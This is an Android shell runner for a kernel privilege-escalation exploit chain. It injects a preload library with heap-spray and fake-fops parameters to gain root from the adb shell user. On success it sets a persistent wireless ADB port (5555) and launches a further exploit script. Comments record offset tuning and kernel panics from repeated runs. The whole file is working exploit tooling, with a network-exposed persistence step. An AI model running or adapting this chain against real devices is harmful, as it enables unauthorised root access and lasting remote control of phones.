#!/system/bin/sh
# su is optional: after a post-panic reboot without the overlay/APatch fake
# there is none, and the post-lock scenario has none either.  The chain is
# designed to run uid2000 (Tier-0); the su -c wrapper is a dev convenience
# (root launch enables kprobe layout + kallsyms).  Without it the constructor
# silently degrades to the static target layout.
if [ -x /system/bin/su ]; then
  /system/bin/su -c 'echo 1 > /proc/sys/kernel/softlockup_panic; echo 1 > /proc/sys/kernel/hung_task_panic; echo 5 > /proc/sys/kernel/panic; echo 1 > /proc/sys/kernel/panic_on_oops'
fi

# --- reboot-cause ledger ---
# 2026-10-14: STATE/CAUSE/log moved from /sdcard to /data/local/tmp (f2fs).
# /sdcard is FUSE: the fuse daemon writes back asynchronously, so a panic
# within ~30s of launch loses START + every log row (run5: chain5.log=0,
# state stuck on the previous run).  f2fs files written with KS_LOG_SYNC=1
# (fflush+fsync per pr_* line) are durable against the panic path, and
# /data/local/tmp survives reboot (verified 10-01..10-08 coexistence).
STATE=/data/local/tmp/chain_run.state
CAUSE=/data/local/tmp/chain_reboot.log
# Termux-adbd (uid=10301, untrusted_app): SELinux denies create in
# shell_data_file /data/local/tmp entirely (not just DAC on old files).
# Fall back to the Termux app's own home — same f2fs /data partition, so
# KS_LOG_SYNC durability is unchanged.  Pollers check both locations.
TUXHOME=/data/data/com.termux/files/home
if ! ( : > "$STATE" ) 2>/dev/null; then
  mkdir -p "$TUXHOME/ksu_chain" 2>/dev/null
  STATE="$TUXHOME/ksu_chain/chain_run.state"
  CAUSE="$TUXHOME/ksu_chain/chain_reboot.log"
fi

classify_reboot() {
  why="$1"
  br=$(getprop ro.boot.bootreason)
  br2=$(getprop sys.boot.reason)
  br3=$(getprop ro.boot.reason)
  pon=$(getprop ro.boot.pon_reason)
  poff=$(getprop ro.boot.poff_reason)
  bid=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
  up=$(cut -d' ' -f1 /proc/uptime)
  ptext=""
  for f in /sys/fs/pstore/console-ramoops* /sys/fs/pstore/dmesg-ramoops*; do
    [ -f "$f" ] || continue
    ptext="$ptext$(tail -c 4000 "$f" | grep -aE 'Kernel panic|BUG: soft lockup|panic_on_oops|sysrq.*[Cc]rash|watchdog: BUG' | tail -4)"
  done
  verdict=UNKNOWN
  echo "$ptext" | grep -qE 'Kernel panic|soft lockup|watchdog: BUG' && verdict=PANIC_TEXT
  case "$br $br2 $br3" in
    *panic*|*watchdog*|*abnormal*) verdict="$verdict+PANIC_BOOTREASON";;
    *longkey*|*long_press*|*powerkey*|*userrequested*|*reboot,*) verdict="$verdict+MANUAL_BOOTREASON";;
  esac
  case "$poff" in
    *KPDPWR*|*RESIN*|*HARD_RESET*|*SMPL*) verdict="$verdict+MANUAL_PMIC";;
    *WARM*) verdict="$verdict+WARM_RESET";;
  esac
  echo "$(date '+%F %T') why=$why boot_id=$bid uptime=$up br=$br br2=$br2 br3=$br3 pon=$pon poff=$poff verdict=$verdict pstore=[$ptext]" >> "$CAUSE"
}

if [ -f "$STATE" ]; then
  prev_bid=$(grep -o 'boot_id=[^ ]*' "$STATE" | tail -1 | cut -d= -f2)
  cur_bid=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
  if [ -n "$prev_bid" ] && [ "$prev_bid" != "$cur_bid" ]; then
    classify_reboot "reboot_between_runs"
  fi
  if grep -q '^START' "$STATE" && ! grep -q '^DONE' "$STATE"; then
    classify_reboot "prev_run_no_DONE_chain_was_active"
  fi
fi
# Refuse to start if another chain instance is already live: two instances
# race the same global misc.fops rb slot and payload page (chain8 died that
# way, Comm=sh of the *other* session).  ARGS-grep is unusable here: the
# chain child's own ARGS is just `sh -c echo CHAIN_EXIT_OK` (LD_PRELOAD is
# in its ENVIRON), and grepping ARGS for the so name matches this runner's
# own launch wrapper (PRELOAD_SO=/data/local/temp/preload_fix47.so ...).
# Scan same-uid /proc/*/environ for a live LD_PRELOAD pointing at a
# preload*.so instead; skip our own pid and our nohup wrapper (which only
# carries PRELOAD_SO, not LD_PRELOAD).
self=$$
chain_live=0
for e in /proc/[0-9]*/environ; do
  pid=${e#/proc/}
  pid=${pid%/environ}
  [ "$pid" = "$self" ] && continue
  # The redirect open error (other uids) is emitted by the SHELL, not tr;
  # it must be silenced at the group level or the scan floods stderr.
  # Match ONLY chain sos (/data/local/tmp|temp/preload*.so): Termux ships
  # libtermux-exec-ld-preload.so in every fish/sh environ and the old broad
  # `.*preload.*\.so` aborted every Termux-adbd run on a false positive.
  if { tr '\0' '\n' < "$e" || :; } 2>/dev/null | grep -qE '^LD_PRELOAD=.*/data/local/(tmp|temp)/preload'; then
    echo "ABORT: another LD_PRELOAD chain instance is running (pid=$pid):" >&2
    ps -A -o PID,ARGS 2>/dev/null | grep -E "^[[:space:]]*$pid " >&2
    chain_live=1
    break
  fi
done
if [ "$chain_live" -ne 0 ]; then
  echo "ABORT_CONCURRENT_INSTANCE $(date '+%F %T')" >&2
  exit 3
fi

echo "START $(date '+%F %T') boot_id=$(cat /proc/sys/kernel/random/boot_id) uptime=$(cut -d' ' -f1 /proc/uptime)" > "$STATE"
sync
# Death-cause channel (2026-10-16): app-uid rounds die with START written,
# P_CHAIN_LAUNCH printed, no SCRIPT_RC, no AMS kill log — so the signal is
# either TERM/HUP (catchable, recorded here) or SIGKILL (absence of any
# trap line proves it).
trap 'echo "RUNNER_TRAP unexpected rc=$? sig=$?"' EXIT
trap 'echo "RUNNER_TRAP TERM"; exit 143' TERM
trap 'echo "RUNNER_TRAP HUP"; exit 129' HUP
trap 'echo "RUNNER_TRAP INT"; exit 130' INT
echo "P_START_OK"
# 2026-10-14 run6 forensics: /data is mounted fsync_mode=nobarrier — a
# per-line fsync (KS_LOG_SYNC) pushes node/data to the UFS write buffer
# without a barrier and never advances the f2fs checkpoint, so a panic
# wipes the whole file (chain5.log vanished on reboot while the STATE row,
# protected by the sync right above, survived).  A background syncer every
# 5s buys a real checkpoint + FLUSH: at most the last ~5s of rows can be
# lost, everything before is durable.
( while :; do sleep 5; sync; done ) &
SYNCER=$!

rm -f /data/local/temp/chain5.log /data/local/tmp/chain5.log /sdcard/chain5.log /sdcard/chain5.log.mirror 2>/dev/null
# Runner step markers (2026-10-15): the 23:26 app round died with START
# written and nothing else — no SCRIPT_RC, empty chain5.log — with the
# runner and chain both gone and a kernel panic ~1min later.  Silent gaps
# made the death point unfindable; every phase now leaves a marker in the
# runner's stdout (chain_run.out).
echo "P_RM_DONE rc=$?"
# Launch as root when su exists: kptr_restrict write + tracefs kprobe layout
# probe + kallsyms all require uid 0 (shell runs silently degrade to static
# target layout). KS_LAYOUT_PVO deliberately NOT set: the value 0x4b40000000
# was measured on the pre-run4-reboot boot and RANDOMIZE_MEMORY re-rolls
# physvirt_offset every boot -- ks_probe_layout measures it fresh here.
# 2026-10-14: log moved to f2fs /data/local/tmp/chain5.log (CHAIN_LOG) —
# /sdcard is FUSE and lost every row of run5 on panic; /data/local/tmp
# survives reboot (verified 10-01..10-08 coexistence) and fsync per line
# hits real f2fs.  Old /sdcard//data/local/temp copies are rm'd above so a
# stale file can never masquerade as this run's log.
# Stale preload.so can end up owned by shell but labelled system_data_file
# (a boot where the chcon -R never ran); shell then cannot unlink/overwrite
# it, and push fails with "Permission denied" while still exiting 0.  In
# that case push the new build under a fresh name and point PRELOAD_SO at it.
PRELOAD_SO="${PRELOAD_SO:-/data/local/temp/preload.so}"
# KS_PSELECT_FOPS_VOFF: the payload lattice lays fops tables ALIGNED every
# 0x80 bytes (put_fake_fops_table(p, fo)), and 0xe80 (the skb head/frag
# split) is a multiple of 0x80 so frag-relative kernel offsets still hit
# lattice slots.  With VOFF=1 the kernel reads open at fake+1+0x70 (mod
# 0x80 == 0x71) = a byte-shifted garbage pointer -> jump-to-garbage panic
# at "opening ashmem" (2026-10-13 run: content verified correct at 0x1070,
# nhit2=1, still panicked; boot6's "+1 works" lore came from an older
# +1-shifted content builder).  VOFF=0 is the only self-consistent value
# with this builder; the parent-qword clobber of the owner slot at
# value+0 is the same try_module_get(garbage-as-module) hazard boot6
# already proved survivable.
# KS_PIPE_SLABS=15: no-root boots cannot raise fs/pipe-user-pages-soft
# (stock 16384 cap kills the full 64-slab set on F_SETPIPE_SZ -> pr_error);
# 15 slabs x 32 slots = 480 pipes = 15360 pages < 16384, enough on a
# fresh boot where free kmalloc-2k objects are ~100-400.
# KS_PSELECT_FOPS_VOFF=1 (was 0): run7 pc decode proved content is +1
# shifted — [fake+0x50] read (ASHMEM_IOCTL<<8)|0xff, i.e. kernel sees
# page[X]=buf[X-1] (three boots, low-21-bit stable).  +1 cancels it so
# every fops slot reads its full value; boot6 verified the same setting
# (open fd=65 + cfgfs rd=8).  VOFF=0 panicked at SET_NAME in run5/6/7.
CHAIN_ENV="LD_PRELOAD=$PRELOAD_SO KS_LOG_SYNC=1 KS_PSELECT_BSS_LOCK=1 KS_CFGFS_LOG=1 KS_PAYLOAD_SCAN=1 KS_RECLAIM_DETERMINISTIC=1 KS_PSELECT_FOPS_VOFF=1 KSUD_NO_PARENT_INSTALL=1 SU_INSTALL=0 KSNITCH_VERBOSE=1 KS_PIPE_SLABS=15 KS_PAYLOAD_BASE_FILE=/data/local/tmp/skbdelta KS_STATE_FILE=$STATE"
# 2026-10-14 run5 forensics: every row went to /sdcard (FUSE).  A panic ~10s
# after launch left chain5.log=0 rows and a stale START — the fuse daemon's
# writeback never made it to f2fs.  Log now goes to f2fs; preload's
# KS_LOG_SYNC=1 (fflush+fsync per pr_* line) is a real fsync on this fd.
CHAIN_LOG=/data/local/tmp/chain5.log
# Same SELinux create-denial as STATE above — the chain command's
# `> $CHAIN_LOG` redirect would fail and kill the run at launch.
if ! ( : >> "$CHAIN_LOG" ) 2>/dev/null; then
  CHAIN_LOG="$TUXHOME/ksu_chain/chain5.log"
fi
# 2026-10-15 run16: USB drops are routine (2-5 min).  The LD_PRELOAD sh
# runs under `su -c`, which inherits adbd's session: when adb disconnects
# adbd delivers SIGHUP and the chain dies mid-window (run16 froze in the
# physrw window and was killed at the disconnect; chain_run.state stayed
# START forever).  setsid detaches the chain from adbd's session so it
# survives the drop and can be inspected (wchan) or resumed afterwards.
# Contract watcher: the chain prints `pipe-physrw-summary ... root=1` from
# inside the uid0 window (then dies within microseconds, and a tail-end
# kernel panic strikes after `exit tail: constructor returning` but before
# sh's echo — 19:04 run confirmed the full root chain plus all tail probes,
# then panic, state stuck at START).  The contract lives in the LOG, so lock
# rc=0 into state the moment the line appears, ahead of any panic/kill.
# MUST be launched BEFORE the blocking chain command below — a watcher
# started after rc=$? never sees the chain alive (round10 bug: watcher was
# appended post-wait, DONE was never locked despite root=1 in the log).
# A second DONE appended by the main path below is harmless.
(
  # 0.3s tick: the contract line -> tail panic window is milliseconds, so
  # a 1s poll lost the race (21:13 run).  The in-process lock
  # (ks_lock_contract_state) is the primary; this stays as backup.
  for i in $(seq 1 3000); do
    if grep -qaE 'pipe-physrw-summary.*root=1' "$CHAIN_LOG" 2>/dev/null; then
      echo "DONE $(date '+%F %T') rc=0 (contract line seen)" >> "$STATE"
      sync
      exit 0
    fi
    sleep 0.3
  done
) &
CONTRACT_WATCH=$!
echo "P_WATCHER pid=$CONTRACT_WATCH"
echo "P_CHAIN_LAUNCH $(date '+%F %T')"
if [ -x /system/bin/su ]; then
  /system/bin/su -c "setsid $CHAIN_ENV /system/bin/sh -c 'setprop persist.adb.tcp.port 5555 2>/dev/null; echo CHAIN_EXIT_OK'" \
  > "$CHAIN_LOG" 2>&1
else
  # The constructor runs inside this sh via LD_PRELOAD and returns after the
  # chain finishes; on success the sh is uid0, so this setprop persists the
  # permanent wireless-debug port before CHAIN_EXIT_OK.  On a failed run sh
  # is still uid2000 -> setprop fails silently (2>/dev/null) and the ';'
  # keeps echo's rc=0, so the success contract is unaffected.
  setsid env $CHAIN_ENV /system/bin/sh -c 'setprop persist.adb.tcp.port 5555 2>/dev/null; [ -x /data/local/tmp/exp_v6c.sh ] && /data/local/tmp/exp_v6c.sh; echo CHAIN_EXIT_OK' \
  > "$CHAIN_LOG" 2>&1
fi
rc=$?
echo "SCRIPT_RC=$rc" >> "$CHAIN_LOG"
sync
# rc alone is NOT a success signal: the LD_PRELOAD constructor swallows
# exploit failure, sh still echoes CHAIN_EXIT_OK and exits 0 — observed
# 2026-10-09 boot 4eced9ab: DONE rc=0 while pipe physrw reported
# done=0 root=0 (cache gate failed x10) and coldstart then died on
# "sig_enforce still 1".  Success contract (AGENTS): the pipe physrw
# summary must show root=1.
if [ "$rc" -eq 0 ] && ! grep -q 'root=1' "$CHAIN_LOG"; then
  echo "CHAIN_NO_ROOT $(date '+%F %T'): constructor exited 0 but no root=1 in log" >> "$CHAIN_LOG"
  echo "CHAIN_NO_ROOT $(date '+%F %T')" >> "$CAUSE"
  rc=1
fi
echo "DONE $(date '+%F %T') rc=$rc" >> "$STATE"
sync
kill "$SYNCER" 2>/dev/null
echo SCRIPT_DONE
